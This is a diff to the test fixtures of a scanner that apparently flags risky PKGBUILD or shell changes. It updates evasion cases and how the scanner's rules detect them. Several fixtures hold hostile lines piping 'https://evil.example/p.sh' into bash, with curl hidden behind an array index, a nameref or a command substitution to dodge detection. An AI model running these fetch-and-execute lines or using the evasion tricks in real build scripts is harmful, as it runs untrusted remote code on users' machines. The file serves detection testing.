@@ -105,17 +105,15 @@ add("evasion-command-via-plus-eq",
 add("evasion-depends-via-plus-eq",
     diff(
         "depends+=('evil-pkg' 'evil-pkg2')",
+        "makedepends+=('git')",
     ),
-    description="depends+= is not parsed as a dependency declaration, so "
-                "nothing reports it (cold DB) and D003 sees no network "
-                "makedepends",
-    # This one stays open after Phase 3, deliberately.  Parsing depends+=
-    # is the reachable half; the scoring half is D001, which is corpus-based
-    # and silent on the cold database the gates run against - a plain
-    # depends=(...) scores 0 here too.  Labelling it for D001 records the
-    # rule that would have to fire for the shape to be covered, and leaves
-    # the fixture honestly failing until a warmed-corpus gate exists.
-    known_gap=True, must_fire=["D001"], min_score=25)
+    description="Both arrays are appended with +=. The parser now reads the "
+                "compound assignment, so the change summary reports the "
+                "names and D003 sees the network makedepend on the cold "
+                "database the gates run against. D001 on the appended novel "
+                "name reads the dependency corpus, so it is gated warm in "
+                "the warm fixture category rather than here",
+    known_gap=False, must_fire=["D003"], min_score=15)
 
 # ── 5. A heredoc feeds a shell a variable-routed pipe ────────────────────────
 
@@ -157,22 +155,28 @@ add("evasion-command-via-array-index",
         "${A[0]} https://evil.example/p.sh | bash",
     ),
     description="curl is stored as an array element and reached through "
-                "${A[0]}; the resolver folds A only as a whole, never by "
-                "subscript, and ${A[0]} is not the ${!name} form H080 reads, "
-                "so the fetch line keeps no literal curl",
-    known_gap=True, must_fire=["R133"], min_score=40)
+                "${A[0]}. The tokenizer folds a statically indexed element, "
+                "so the resolved line carries `curl ... | bash` and R001 "
+                "owns the pipeline; X002 stands down for the static "
+                "subscript rather than scoring the same command twice. A "
+                "dynamic subscript (${A[$i]}) stays unresolved and remains "
+                "X002's",
+    known_gap=False, must_fire=["R001"], min_score=40)
 
 # ── 8. The fetch tool is reached through a nameref ───────────────────────────
 
 add("evasion-command-via-nameref",
     diff(
-        "declare -n R=curl",
+        "declare -n R=C",
+        "C=curl",
         "$R https://evil.example/p.sh | bash",
     ),
-    description="declare -n makes R a nameref for curl; the assignment "
-                "resolver does not parse `declare -n name=target`, so $R "
-                "never resolves and the fetch line keeps no literal curl",
-    known_gap=True, must_fire=["R134"], min_score=40)
+    description="declare -n R=C makes $R expand to the *value* of C, which "
+                "is curl; the assignment resolver does not parse `declare "
+                "-n name=target`, so $R stays unresolved. X002 claims the "
+                "variable in command position and X023 the pipe into a "
+                "shell",
+    known_gap=False, must_fire=["X002"], min_score=40)
 
 # ── 9. The fetch tool is assembled in a command substitution ─────────────────
 
@@ -184,8 +188,10 @@ add("evasion-command-via-command-subst",
     description="curl is spelled by a printf inside $( ), which the resolver "
                 "refuses to fold (no static value), so $C stays unresolved "
                 "and no literal curl - split across 'cur' and 'l' - survives "
-                "on any line",
-    known_gap=True, must_fire=["R135"], min_score=40)
+                "on any line. X002 claims the variable in command position "
+                "and X023 the pipe into a shell; the parse-time substitution "
+                "is also a coverage gap",
+    known_gap=False, must_fire=["X002"], min_score=40)
 
 
 def main() -> int:
